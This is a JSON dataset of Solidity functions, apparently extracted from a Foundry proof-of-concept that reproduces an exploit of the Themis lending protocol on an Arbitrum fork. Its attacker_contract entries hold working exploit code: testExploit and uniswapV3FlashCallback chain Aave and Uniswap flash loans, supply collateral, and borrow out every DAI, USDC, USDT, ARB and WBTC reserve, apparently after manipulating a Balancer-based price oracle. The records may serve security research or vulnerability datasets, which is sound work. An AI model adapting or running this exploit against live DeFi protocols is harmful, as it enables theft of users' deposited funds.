[
  {
    "contract/interface": "IThemis",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IThemis",
    "source_type": "victim_contract",
    "function_name": "setUserUseReserveAsCollateral",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IThemis",
    "source_type": "victim_contract",
    "function_name": "supply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address spender, uint256 value) external returns (bool) {\n    allowance[msg.sender][spender] = value;\n\n    emit Approval(msg.sender, spender, value);\n\n    return true;\n  }\n",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "  function transfer(address to, uint256 value) external returns (bool) {\n    require(to != address(0) && to != address(this), \"Dai/invalid-address\");\n    uint256 balance = balanceOf[msg.sender];\n    require(balance >= value, \"Dai/insufficient-balance\");\n\n    balanceOf[msg.sender] = balance - value;\n    balanceOf[to] += value;\n\n    emit Transfer(msg.sender, to, value);\n\n    return true;\n  }\n  function transferFrom(address from, address to, uint256 value) external returns (bool) {\n    require(to != address(0) && to != address(this), \"Dai/invalid-address\");\n    uint256 balance = balanceOf[from];\n    require(balance >= value, \"Dai/insufficient-balance\");\n\n    if (from != msg.sender) {\n      uint256 allowed = allowance[from][msg.sender];\n      if (allowed != type(uint256).max) {\n        require(allowed >= value, \"Dai/insufficient-allowance\");\n\n        allowance[from][msg.sender] = allowed - value;\n      }\n    }\n\n    balanceOf[from] = balance - value;\n    balanceOf[to] += value;\n\n    emit Transfer(from, to, value);\n\n    return true;\n  }\n",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "  function transferFrom(address from, address to, uint256 value) external returns (bool) {\n    require(to != address(0) && to != address(this), \"Dai/invalid-address\");\n    uint256 balance = balanceOf[from];\n    require(balance >= value, \"Dai/insufficient-balance\");\n\n    if (from != msg.sender) {\n      uint256 allowed = allowance[from][msg.sender];\n      if (allowed != type(uint256).max) {\n        require(allowed >= value, \"Dai/insufficient-allowance\");\n\n        allowance[from][msg.sender] = allowed - value;\n      }\n    }\n\n    balanceOf[from] = balance - value;\n    balanceOf[to] += value;\n\n    emit Transfer(from, to, value);\n\n    return true;\n  }\n",
    "description": ""
  },
  {
    "contract/interface": "IGauge",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "getPoolId",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "balancerSwap",
    "original_code": "    function balancerSwap(address tokenA, address tokenB, uint256 swapAmount) public {\n        IBalancerVault.SingleSwap memory single = IBalancerVault.SingleSwap({\n            poolId: BalancerPool.getPoolId(),\n            kind: IBalancerVault.SwapKind(0),\n            assetIn: tokenA,\n            assetOut: tokenB,\n            amount: swapAmount,\n            userData: \"\"\n        });\n\n        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({\n            sender: address(this),\n            fromInternalBalance: false,\n            recipient: payable(address(this)),\n            toInternalBalance: false\n        });\n\n        BalancerVault.swap(single, funds, 0, block.timestamp);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        UniPool1.flash(address(this), 0, 10_000 * 1e18, \"\");\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 105_524_523);\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(AaveV3), \"AaveV3\");\n        cheats.label(address(UniPool1), \"UniPool1\");\n        cheats.label(address(UniPool2), \"UniPool2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        WETH.approve(address(AaveV3), type(uint256).max);\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 22_000 * 1e18;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        uniswapV3Swap(DAI_USDC, true, DAI.balanceOf(address(this)), 39_213_280_958_319_573_512_907);\n        uniswapV3Swap(WETH_ARB, false, ARB.balanceOf(address(this)), 6_123_808_957_771_478_940_080_370_857_742);\n        uniswapV3Swap(WBTC_WETH, true, WBTC.balanceOf(address(this)), 21_845_559_093_545_742_410_589_827_953_560_948);\n        emit log_named_decimal_uint(\n            \"Attacker's amount of WETH after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker's amount of USDC after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker's amount of USDT after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        if (msg.sender == address(UniPool1)) {\n            UniPool2.flash(address(this), 8000 * 1e18, 0, \"\");\n            WETH.transfer(msg.sender, 10_000 * 1e18 + fee1);\n        } else {\n            WETH.approve(address(BalancerVault), type(uint256).max);\n            WETH.approve(address(AttackedThemisContract), type(uint256).max);\n            wstETH.approve(address(BalancerVault), type(uint256).max);\n            BalancerPool.approve(address(BalancerGauge), type(uint256).max);\n            BalancerGauge.approve(proxyAddress, type(uint256).max);\n\n            Aggregator.latestAnswer();\n\n            AttackedThemisContract.supply(address(WETH), 220e18, address(this), 0);\n            AttackedThemisContract.setUserUseReserveAsCollateral(address(WETH), true);\n\n            // emit log_uint(DAI.balanceOf(themisDAI));\n            borrowTokens(address(DAI), DAI.balanceOf(themisDAI));\n            borrowTokens(address(USDC), USDC.balanceOf(themisUSDC));\n            borrowTokens(address(USDT), USDT.balanceOf(themisUSDT));\n            borrowTokens(address(ARB), ARB.balanceOf(themisARB));\n            borrowTokens(address(WBTC), WBTC.balanceOf(themisWBTC));\n\n            WETH.withdraw(55e18);\n\n            AContract = new AttackContract{value: 55 ether}();\n\n            balancerSwap(address(wstETH), address(WETH), wstETH.balanceOf(address(this)));\n            WETH.transfer(msg.sender, 8000 * 1e18 + fee0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ThemisTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (msg.sender == DAI_USDC) {\n            DAI.transfer(DAI_USDC, uint256(amount0Delta));\n        } else if (msg.sender == WETH_ARB) {\n            ARB.transfer(WETH_ARB, uint256(amount1Delta));\n        } else {\n            WBTC.transfer(WBTC_WETH, uint256(amount0Delta));\n        }\n",
    "description": ""
  }
]